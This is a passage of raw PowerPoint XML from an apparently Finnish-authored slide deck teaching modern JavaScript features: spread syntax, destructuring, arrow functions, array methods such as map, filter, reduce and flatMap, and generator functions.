              <a:t>foo</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bar</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>", x: 42 }</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mergedObj</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> = { ...</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="001080"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>obj1</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obj2</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mergedObj</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>);</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>// Object { </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1400" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>foo</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baz</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>", x: 42, y: 13 }</a:t>
            </a:r>
            <a:endParaRPr lang="fi-FI" sz="1400" b="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="14047535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848EE8B-C29D-4FEF-B326-391E6D2ECB9F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Destructing Assignment</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Sisällön paikkamerkki 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{5765C49C-6E00-491D-9255-CA2AFD237B0F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609600" y="1600200"/>
            <a:ext cx="10972800" cy="4983162"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="1800" dirty="0"/>
              <a:t>ES6 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="1800" dirty="0" err="1"/>
              <a:t>destructuring</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="1800" dirty="0"/>
              <a:t> assignment syntax allows to unpack values from arrays, or properties from objects, into distinct variables</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="1800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="1800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
              </a:rPr>
            </a:br>
            <a:endParaRPr lang="fi-FI" sz="1800" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0000FF"/>
              </a:solidFill>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pP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b</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rest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b</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>] = [</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="098658"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>10</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20</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>];</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pP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10</a:t>
            </a:r>
            <a:endParaRPr lang="fi-FI" sz="1800" b="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pP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b</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20</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a</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b</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rest</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>] = [</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="098658"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>10</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20</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30</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40</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50</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>];</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pP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rest</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[30, 40, 50]</a:t>
            </a:r>
            <a:endParaRPr lang="fi-FI" sz="1800" b="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="AF00DB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>for</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let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item</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>] </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>of</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rest</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entries</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>()) {</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001080"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>i</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item</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>); </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>}</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>const</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0070C1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>user</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> = { </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="001080"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>userId</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="001080"/>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098658"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>42</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userName</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="001080"/>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testbot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p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>const</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> {</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0070C1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>userId</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0070C1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>userName</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>} = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0070C1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>user</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destruct</a:t>
            </a:r>
            <a:endParaRPr lang="fi-FI" sz="1800" b="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pP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userId</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userName</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42 "</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>testbot</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>"</a:t>
            </a:r>
            <a:endParaRPr lang="fi-FI" sz="1800" b="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2163569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5ECCF8AA-3273-4032-B511-7049166D0BF9}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" dirty="0"/>
              <a:t>Arrow Syntax (ES6)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="58371" name="Content Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{31B748E9-B032-40AD-B448-A107375586F9}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609600" y="1389470"/>
            <a:ext cx="10972800" cy="5279890"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t>ES6 introduced arrow syntax to especially make it easier to write short functions parameter(s) =&gt; expression/function body</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square</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add</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a</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b</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a</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="0" dirty="0" err="1">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b</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printMany</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s</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n</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5</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while</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n</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>-- &gt; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="098658"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>0</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console</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log</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s</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console</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log</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add</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square</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3</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square</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printMany</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"five"</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printMany</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"three"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="098658"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>3</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>);</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" altLang="fi-FI"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36419391-496F-4779-85F6-9FD6203A4230}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" dirty="0"/>
              <a:t>Functional Programming Using Arrays</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="100355" name="Content Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8555303E-7DA3-4281-93D2-D6CCD0E7B5DC}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>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printArray</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a</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toString</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a</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> = [</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="098658"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>1</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2</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3</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10</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0</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100</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printArray</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a</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printArray</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filter</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a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="098658"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>2 </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0</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printArray</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map</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printArray</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reduce</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y</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x</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y</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sentence</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"Programming is </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>hard</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work</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but</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rewarding</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words</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="001080"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>sentence</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flatMap</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x</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split</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 "</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printArray</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words</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D78B14E7-3833-4000-948A-41DB075B2AEF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" dirty="0"/>
              <a:t>Generator Function</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="59395" name="Content Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E76B7350-6ACA-4591-8A80-0EC9331AF449}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t>Generator functions are an easy way to make iterators</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generatorName</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params</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yield</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returnValue</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yield</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a: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anotherGenerator</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p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" dirty="0">
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>You can iterate them using </a:t>
            </a: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for</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of</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generatorName</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>())</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" dirty="0">
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>but be cautious of potential endless loop</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" dirty="0">
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>You can also use:</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" dirty="0">
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
            </a:b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iter</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="795E26"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>generatorName</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params</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make the generator</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iter</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next</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value</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will return next yield value</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" b="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="Consolas" panose="020B0609020204030204"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211D8BD1-C754-42CD-B8AA-595EF521FDB1}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t>Calculating Fibonacci Numbers using Generator</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="60419" name="Content Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
